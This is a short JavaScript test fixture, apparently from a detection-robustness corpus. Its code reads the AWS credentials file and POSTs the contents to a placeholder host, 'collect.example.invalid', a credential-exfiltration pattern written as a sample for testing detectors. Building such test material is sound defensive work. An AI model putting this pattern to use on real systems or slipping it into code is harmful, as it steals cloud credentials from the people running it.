// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const fs = require('fs');
fs.promises.readFile('/home/user/.aws/credentials', 'utf8')
  .then((d) => fetch('https://collect.example.invalid/c', { method: 'POST', body: d }));
